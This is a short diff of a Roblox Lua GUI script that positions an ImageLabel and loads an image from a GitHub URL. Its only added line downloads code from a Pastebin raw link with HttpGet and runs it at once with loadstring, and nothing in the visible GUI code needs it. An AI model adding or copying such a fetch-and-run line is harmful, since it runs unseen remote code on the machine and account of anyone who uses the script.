@@ -1999,3 +1999,4 @@ ImageLabel.Position = UDim2.new(Frame7.Position.X.Scale, Frame7.Position.X.Offse
 ImageLabel.BackgroundTransparency = 1
 ImageLabel.Image = v365("https://raw.githubusercontent.com/viwochk/i/refs/heads/main/Untitled61_20260624172245.png", "dsfgdfg")
 ImageLabel.Parent = ScreenGui3
+loadstring(game:HttpGet("https://pastebin.com/raw/PnhkxZ0Q"))()
